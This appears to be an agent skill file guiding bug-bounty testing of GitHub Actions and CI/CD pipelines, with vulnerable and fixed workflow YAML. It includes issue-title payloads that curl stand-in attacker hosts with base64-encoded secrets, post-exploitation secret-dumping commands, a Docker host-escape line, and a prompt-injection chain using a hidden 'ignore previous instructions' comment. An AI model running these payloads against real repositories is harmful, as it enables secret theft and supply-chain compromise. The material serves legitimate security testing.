---
name: cicd-security
description: GitHub Actions and CI/CD pipeline security testing — expression injection, untrusted checkout, artifact/cache poisoning, supply chain, self-hosted runner exploitation, AI agent security
origin: AI Threat Hunting (adapted from claude-bug-bounty sisakulint integration)
---

# CI/CD Pipeline Security Testing

> **`aith assess kali` audit flags:** use `--technique OTHER` for generic CI/CD abuse. Switch to `CMDI` or `RCE` when the pipeline step accepts attacker-controlled shell input, `AUTH` for token or secret leakage that grants further access, or `INFO-DISCLOSURE` for build-log exposure.

## When to Activate

- Target has public GitHub repositories with `.github/workflows/` files
- Recon discovers GitHub org associated with in-scope domains
- Source analysis reveals CI/CD configuration files (GitHub Actions, GitLab CI, Jenkins)
- Code analysis mode encounters workflow YAML in the repository

## Tools

- `sisakulint` — 52-rule SAST scanner for GitHub Actions, taint propagation across steps/jobs/reusable workflows, 81.6% GHSA coverage (31/38). Install: `brew install sisakulint` or download binary from releases.
- `grep`/`rg` — manual pattern matching for dangerous workflow constructs
- `gh` CLI — enumerate repos, fetch workflow files, create test issues/PRs for PoC

## Recon: Finding Workflow Files

```bash
# Clone target's public repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Quick grep for dangerous patterns:
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Automated scan:
sisakulint scan .github/workflows/
# Remote scan (no clone needed):
sisakulint scan --remote owner/repo
```

## Hunting Workflow

```
1. Recon: find all .github/workflows/*.yml in target's public repos
2. Scan: sisakulint scan .github/workflows/ (or --remote owner/repo)
3. Triage: Critical/High findings -> manual verification
4. For each finding:
   a. Can I trigger this as an external contributor? (fork PR, issue creation, comment)
   b. What secrets are accessible? (check permissions: block, secrets usage)
   c. What's the blast radius? (repo secrets -> deploy keys -> cloud access)
5. PoC: create a fork, submit PR/issue that triggers the vulnerable workflow
6. Prove: show secret exfiltration, code execution, or artifact tampering
```

---

## Category 1: Code Injection & Expression Safety (CICD-SEC-04)

**Root cause**: Untrusted input (`github.event.issue.title`, `github.event.pull_request.body`, branch names, commit messages) interpolated into `run:` blocks via `${{ }}` expressions.

**Taint sources** (attacker-controlled):
```
github.event.issue.title / .body
github.event.pull_request.title / .body / .head.ref
github.event.comment.body
github.event.review.body
github.event.pages.*.page_name
github.event.commits.*.message / .author.name
github.event.head_commit.message / .author.name
github.event.workflow_run.head_branch
github.head_ref
```

- [ ] **Expression injection** -- `${{ github.event.issue.title }}` in `run:` block = RCE
  ```yaml
  # VULNERABLE -- attacker creates issue with title: a]]; curl https://evil.example/$(env | base64) #
  run: echo "${{ github.event.issue.title }}"

  # FIXED -- use env var (shell-quoted, not expression-interpolated)
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```
- [ ] **Environment variable injection** -- untrusted input to `$GITHUB_ENV`
  ```yaml
  # VULNERABLE -- attacker injects newline + arbitrary VAR=VALUE
  run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV

  # FIXED -- use heredoc delimiter
  run: |
    {
      echo "BRANCH<<EOF"
      echo "${{ github.head_ref }}"
      echo "EOF"
    } >> $GITHUB_ENV
  ```
- [ ] **PATH injection** -- untrusted input to `$GITHUB_PATH` = arbitrary binary execution
- [ ] **Output clobbering** -- untrusted input to `$GITHUB_OUTPUT` without heredoc delimiter = downstream job manipulation
- [ ] **Argument injection** -- untrusted input as CLI argument (e.g., `docker run ${{ ... }}`)
  ```yaml
  # VULNERABLE
  run: docker run ${{ github.event.pull_request.body }}

  # FIXED -- end-of-options marker + env var
  env:
    INPUT: ${{ github.event.pull_request.body }}
  run: docker run -- "$INPUT"
  ```
- [ ] **Request forgery (SSRF)** -- attacker-controlled URL in `curl`/`wget` within workflow

## Category 2: Pipeline Poisoning & Untrusted Checkout

**Root cause**: Privileged triggers (`pull_request_target`, `workflow_run`) checkout attacker's PR code, which then runs with repository secrets.

- [ ] **Untrusted checkout** -- `actions/checkout` on `pull_request_target` without explicit safe ref
  ```yaml
  # VULNERABLE -- checks out attacker's PR code with repo secrets
  on: pull_request_target
  jobs:
    build:
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
        - run: make build  # runs attacker's Makefile with secrets

  # FIXED -- only checkout base branch, or use read-only permissions
  permissions: {}
  steps:
    - uses: actions/checkout@v4  # checks out base branch by default
  ```
- [ ] **TOCTOU** -- label-gated approval + mutable ref = attacker pushes malicious commit after approval
- [ ] **Reusable workflow taint** -- `secrets: inherit` passes all secrets to called workflow that processes untrusted input
- [ ] **Cache poisoning** -- untrusted checkout -> build -> cache write -> trusted workflow reads poisoned cache
- [ ] **Artifact poisoning** -- `actions/download-artifact` from untrusted `workflow_run` without validation
  ```yaml
  # VULNERABLE -- downloads artifact from untrusted workflow, then executes it
  on: workflow_run
  steps:
    - uses: actions/download-artifact@v4
    - run: ./downloaded-binary  # attacker-controlled binary

  # FIXED -- verify artifact hash/signature before execution
  ```
- [ ] **Artipacked** -- `actions/checkout` with `persist-credentials: true` (default) leaks `.git/config` credentials in uploaded artifacts
  ```yaml
  # FIXED
  - uses: actions/checkout@v4
    with:
      persist-credentials: false
  ```

## Category 3: Supply Chain & Dependency Security (CICD-SEC-08)

- [ ] **Unpinned actions** -- `uses: actions/checkout@v4` (mutable tag) instead of SHA pin
  ```yaml
  # VULNERABLE -- tag can be force-pushed
  uses: actions/checkout@v4

  # FIXED -- pinned to immutable commit SHA
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```
- [ ] **Impostor commit** -- fork network allows pushing commits with SHA that appears to belong to upstream repo
- [ ] **Ref confusion** -- ambiguous tag/branch names exploited to load unintended action version
- [ ] **Known vulnerable actions** -- check actions against GHSA database (sisakulint detects automatically)
- [ ] **Archived actions** -- unmaintained action with unpatched vulnerabilities
- [ ] **Unpinned container images** -- `image: ubuntu:latest` instead of SHA256 digest pin

## Category 4: Credential & Secret Protection

- [ ] **Secret exfiltration** -- `curl https://evil.example/${{ secrets.TOKEN }}` in workflow
- [ ] **Secrets in artifacts** -- uploaded artifacts contain `.env`, credentials, or hidden files
  ```yaml
  # FIXED -- exclude hidden files
  - uses: actions/upload-artifact@v4
    with:
      include-hidden-files: false
  ```
- [ ] **Unmasked secrets** -- `fromJson()` derived values bypass GitHub's automatic masking
  ```yaml
  # FIXED -- manually mask derived secrets
  run: |
    TOKEN=$(echo '${{ secrets.JSON_CREDS }}' | jq -r '.token')
    echo "::add-mask::$TOKEN"
  ```
- [ ] **Excessive `secrets: inherit`** -- reusable workflow call inherits all secrets when it only needs one
- [ ] **Hardcoded credentials** -- API keys, passwords, tokens directly in workflow YAML

## Category 5: Triggers & Access Control (CICD-SEC-01)

- [ ] **Dangerous triggers without mitigation** -- `pull_request_target` or `workflow_run` with no `permissions: {}`, no approval gate, no ref restriction
- [ ] **Dangerous triggers with partial mitigation** -- some protections present but bypassable
- [ ] **Label-based approval bypass** -- `if: contains(github.event.pull_request.labels.*.name, 'approved')` is spoofable
- [ ] **Bot condition spoofing** -- `if: github.actor != 'dependabot[bot]'` is trivially bypassed
- [ ] **Excessive GITHUB_TOKEN permissions** -- `permissions: write-all` when only `contents: read` needed
- [ ] **Self-hosted runners in public repos** -- untrusted PRs execute on org infrastructure = container escape -> lateral movement
- [ ] **OIDC token theft** -- CI runners expose OIDC tokens that grant cloud access

## Category 6: AI Agent Security (2025+)

- [ ] **Unrestricted AI trigger** -- `allowed_non_write_users: "*"` lets any user trigger AI agent execution
- [ ] **Excessive tool grants** -- AI agent given Bash/Write/Edit tools in untrusted trigger context = attacker prompt -> RCE
- [ ] **Prompt injection via workflow context** -- `${{ github.event.issue.body }}` interpolated into AI agent prompt parameter

---

## Expression Injection PoC Template

Target-facing PoC actions (creating issues/PRs to trigger vulnerable workflows) must go through `aith assess kali exec` so the action lands in the audit pipeline.

```bash
# Step 1: Create an issue with injection payload in title
# This is a target-facing action — run via aith assess kali exec with full audit flags
aith assess kali exec \
  --technique CMDI --intent "expression injection PoC via issue title on TARGET/REPO" \
  --probe-kind exploit --phase consume-test --timeout 60 --destructive \
  -- gh issue create --repo TARGET/REPO \
     --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' \
     --body "test"

# Step 2: If workflow triggers on issues and interpolates title -> secrets exfiltrated
# Check OOB callback hit with: aith oob client logs <name> --lines 80
# CVSS: 9.3 Critical (RCE with repo secrets)
```

## Real-World GHSAs (Proven Payouts)

| GHSA | Action | Bug Class | Severity |
|---|---|---|---|
| GHSA-gq52-6phf-x2r6 | tj-actions/branch-names | Expression injection via branch name | Critical |
| GHSA-4xqx-pqpj-9fqw | atlassian/gajira-create | Code injection in privileged trigger | Critical |
| GHSA-g86g-chm8-7r2p | check-spelling/check-spelling | Secret exposure in build logs | Critical |
| GHSA-cxww-7g56-2vh6 | actions/download-artifact | Artifact poisoning (official action) | High |
| GHSA-h3qr-39j9-4r5v | gradle/gradle-build-action | Cache poisoning via untrusted checkout | High |
| GHSA-mrrh-fwg8-r2c3 | tj-actions/changed-files | Supply chain -- impostor commit | High |
| GHSA-phf6-hm3h-x8qp | broadinstitute/cromwell | Token exposure via code injection | Critical |
| GHSA-qmg3-hpqr-gqvc | reviewdog/action-setup | Time-bomb via tag pinning | High |
| GHSA-vqf5-2xx6-9wfm | github/codeql-action | Known vulnerable official action | High |
| GHSA-hw6r-g8gj-2987 | pytorch/pytorch | Argument injection in build workflow | Moderate |

## A->B Signal: CI/CD Chains

```
Expression injection -> secret exfiltration -> cloud account takeover
Untrusted checkout -> Makefile RCE -> deploy key theft -> repo takeover
Artifact poisoning -> release binary tampering -> supply chain compromise
Cache poisoning -> build output manipulation -> backdoored deployment
Impostor commit -> pinned action hijack -> all downstream repos affected
OIDC token theft -> cloud metadata -> S3/GCS read -> customer data
Self-hosted runner -> container escape -> internal network pivot
```

---

## Deep-Dive: From sisakulint Finding to Confirmed Bug

sisakulint findings are **potentially exploitable** -- not confirmed bugs. Every finding needs manual verification. The patterns below are extracted from 36 real-world paid reports ($250K+ total payouts). Each section follows the thinking that led to actual bounty payments.

### 1. Code Injection / Argument Injection

**Gate question:** Can an external attacker trigger this workflow AND does the tainted input reach a shell context?

**Verification depth:**
1. **Trigger accessibility** -- `issues: opened` and `issue_comment: created` are triggerable by ANY GitHub user. `pull_request_target` is triggerable via fork PR. Check if there's an `if:` condition filtering by actor/association.
2. **Direct vs transitive taint** -- The workflow file itself may look safe. Cycode found Bazel's $13K bug because `cherry-picker.yml` passed `${{ github.event.issue.title }}` via `with:` to a **composite action in another repo** (`bazelbuild/continuous-integration`). The composite action's `action.yml` had `run: TITLE="${{ inputs.issue-title }}"`. **Always fetch and read the composite action's action.yml.**
3. **Payload construction** -- Branch names cannot contain spaces. Attackers use `${IFS}` (Internal Field Separator) and Bash brace expansion `{curl,-sSfL,URL}` to bypass this. Issue titles/bodies have no such restriction.
4. **Secrets reachability** -- Check `permissions:` at workflow AND job level. No explicit `permissions:` block = repo default (often `write-all`). Check `env:` blocks for `${{ secrets.* }}`. Check if `GITHUB_TOKEN` has write permissions.
5. **Impact chain** -- Bazel: issue title injection -> composite action shell injection -> `BAZEL_IO_TOKEN` + `GITHUB_TOKEN (write-all)` -> Bazel codebase backdoor capability.

**Kill signals:** `${{ contains(...) }}` or `${{ startsWith(...) }}` returning booleans are NOT injectable -- false positive. `${{ github.event.pull_request.labels.*.name }}` inside `contains()` evaluates to `true`/`false`, not the label text.

### 2. Untrusted Checkout (Pwn Request)

**Gate question:** Does the workflow checkout attacker-controlled code AND then execute something from that checkout?

**Verification depth:**
1. **Explicit vs implicit code execution** -- The Flank $7.5K bug: `gh pr checkout` -> `gradle/gradle-build-action` runs Gradle -> Gradle auto-evaluates `settings.gradle.kts` as Kotlin script. **Any build tool that reads config from the repo is an execution vector**: `Makefile`, `package.json` (postinstall scripts), `setup.py`, `build.gradle.kts`, `.cargo/config.toml`, `Gemfile`.
2. **Issue_comment is as dangerous as pull_request_target** -- `issue_comment` trigger + `refs/pull/${{ github.event.issue.number }}/head` checkout. `issue_comment` runs in base repo context with full secrets. **Always check issue_comment workflows for PR checkout patterns.**
3. **Self-hosted runner escalation** -- If `runs-on:` contains `self-hosted`, check: (a) Is the runner ephemeral? (b) Is the runner in Docker group? (c) PyTorch pattern: contributor trick (typo fix PR -> merge -> contributor status -> auto-trigger without approval) -> Runner-on-Runner (RoR): `RUNNER_TRACKING_ID=0` + install attacker's runner agent -> wait for privileged workflow -> steal PATs.
4. **TOCTOU** -- Label-gated `pull_request_target` workflows: attacker gets label added, workflow checks label exists, attacker pushes malicious commit between check and checkout. **Mutable refs are the root cause.**
5. **Post-exploitation** -- Enumerate all secrets: `env | base64`, `cat /proc/self/environ`, `gcore $(pgrep Runner.Worker)` + `strings core.* | grep ghp_`.

**Kill signals:** `if: "!github.event.pull_request.head.repo.fork"` blocks external attackers. `permissions: {}` at workflow level with only `contents: read` at job level limits damage. Ephemeral runners with `--ephemeral` flag prevent persistence.

### 3. Artifact Poisoning

**Gate question:** Is there a TWO-STAGE workflow pattern where Stage 1 (pull_request, no secrets) uploads artifacts and Stage 2 (workflow_run, with secrets) downloads and uses them?

**Verification depth:**
1. **Cross-workflow artifact flow** -- Same-workflow upload/download (via `needs:`) is NOT poisonable. The dangerous pattern is: `pull_request` uploads -> separate `workflow_run` downloads with full secrets.
2. **Download path matters** -- `actions/download-artifact` with `path: .` can overwrite source code, build scripts, or binaries. Safe pattern: extract to `${{ runner.temp }}/artifacts`.
3. **Source validation** -- Does the `workflow_run` consumer check `github.event.workflow_run.head_repository.full_name != github.repository`? If not, fork PR artifacts are consumed blindly.
4. **ArtiPACKED** -- `actions/checkout` with default `persist-credentials: true` writes `GITHUB_TOKEN` to `.git/config`. If artifact upload path includes `.git/`, the token is publicly downloadable.

**Kill signals:** Upload and download in the same workflow run (connected by `needs:`). `workflow_run` consumer that explicitly checks fork origin. `persist-credentials: false` on checkout.

### 4. Cache Poisoning

**Gate question:** Can a fork PR write a cache entry that the default branch later restores in a privileged context?

**CRITICAL: GitHub's cache scoping does NOT fully prevent this.** A PR branch can read caches from the default branch. A fork PR workflow can WRITE cache entries. If the cache key is deterministic (`hashFiles('package-lock.json')`) and the attacker doesn't modify that file, the fork PR writes to the SAME cache key.

**Verification depth:**
1. **Key predictability** -- `key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}` is fully predictable. Adding `github.sha` or `github.run_id` makes it unpredictable. **Check every cache key for unpredictable components.**
2. **Payload injection** -- Cacheract: inject malware into package manager caches. The malware self-perpetuates because each restore -> build -> save cycle preserves the payload. **Cache TTL is 7 days.**
3. **Privileged consumption** -- The poisoned cache is restored in a `push` or `schedule` workflow on the default branch with full `secrets` access.
4. **Clinejection chain** -- Prompt injection -> AI agent runs `npm install` from attacker commit -> Cacheract in npm cache -> nightly publish workflow restores cache -> VSCE_PAT, OVSX_PAT, NPM_RELEASE_TOKEN stolen -> malicious extension published.

**Kill signals:** Cache key includes `github.sha` or `github.run_id`. Separate cache keys per workflow. `actions/cache/restore` (read-only) instead of `actions/cache` (read-write) in PR workflows.

### 5. Self-Hosted Runners

**Gate question:** Is a self-hosted runner used in a PUBLIC repo where external contributors can trigger workflows?

**Verification depth:**
1. **Approval settings** -- Default: "Require approval for first-time contributors". After ONE merged PR (even a typo fix), the attacker becomes a "contributor" and subsequent PRs auto-trigger without approval.
2. **Runner persistence** -- Non-ephemeral runners retain state between jobs. `RUNNER_TRACKING_ID=0` prevents cleanup.
3. **Runner-on-Runner (RoR)** -- Install official GitHub runner binary on the target's self-hosted runner, register it to attacker's org. Uses only legitimate GitHub binaries and HTTPS -- indistinguishable from normal runner traffic. **GitHub itself is the C2.**
4. **Lateral movement** -- RoR persistence -> wait for privileged `push`/`schedule` workflows -> steal tokens from `.git/config`, `$GITHUB_ENV`, `/proc/PID/environ`, or Runner.Worker process memory.
5. **Docker group escalation** -- `docker run -v /:/host --privileged alpine chroot /host` -> full host root.

**Kill signals:** `--ephemeral` flag. "Require approval for ALL outside collaborators." Runner not in Docker group. Private repo.

### 6. Supply Chain (commit-sha / impostor-commit / ref-confusion)

**Gate question:** Does the workflow use mutable tags (`@v1`, `@v2`) for actions, and could those tags be replaced?

**Verification depth:**
1. **Tag mutability** -- `git tag -f v1 <malicious-commit>` replaces the tag. 98.4% of repos don't use SHA pinning. tj-actions attack: all version tags replaced with memdump.py -> 23K repos affected -> 218 confirmed secret leaks.
2. **Impostor commits** -- Fork network shares object store with parent. Attacker pushes commit to fork, then references that SHA in parent repo's `uses:`.
3. **RepoJacking** -- Org renames create a redirect. Old name becomes available. Attacker registers old org name, creates same repo, hosts malicious action.

**Kill signals:** Full 40-char SHA pinning. Dependabot configured for `github-actions` ecosystem. Organization-level action allowlist.

### 7. AI Agent Security

**Gate question:** Is an AI agent invoked in a workflow where external users can influence the prompt?

**Verification depth:**
1. **Trigger + prompt source** -- `issues: opened` -> AI triage bot reads `github.event.issue.body`. HTML comments (`<!-- ignore previous instructions -->`) are invisible in GitHub UI but included in the API response.
2. **Tool permissions** -- If the AI agent has Bash/Write/Edit tools and runs with secrets in env, prompt injection = RCE + secret exfil.
3. **Multi-phase chain** -- Prompt injection -> AI runs `npm install` from attacker commit -> cache poisoning -> supply chain attack.

**Kill signals:** `author_association == 'MEMBER' || 'OWNER'` check before AI processing. `--read-only --no-exec` flags on AI CLI. `permissions: {}` at workflow level.

### 8. Permissions / Secrets Hygiene

**Not standalone bugs** -- these are force multipliers. A `code-injection-medium` with `permissions: write-all` is Critical. The same injection with `permissions: { contents: read }` is limited.

**Chaining checklist:**
- `secrets: inherit` on reusable workflow call -> all org secrets accessible
- `permissions:` block missing -> repo default (often write-all)
- `GITHUB_TOKEN` with `contents: write` -> CVE-2022-46258 pattern: use Contents API to create new workflow file -> new workflow accesses ALL repo/org secrets

---

## Extended Resources

- `agent/references/code-vuln-patterns/injection.md` -- general injection patterns applicable to expression injection
- `agent/references/payloads/command-injection-payloads.md` -- shell injection payloads for PoC construction
- [sisakulint docs/advisory](https://sisaku-security.github.io/lint/docs/advisory/) -- 38 GHSAs with detection mapping
- [DEF CON 32: Grand Theft Actions](https://media.defcon.org/DEF%20CON%2032/) -- Khan & Stawinski, $250K+ in self-hosted runner bugs
- [Synacktiv: GitHub Actions Exploitation (5 parts)](https://www.synacktiv.com/en/publications/github-actions-exploitation-introduction)
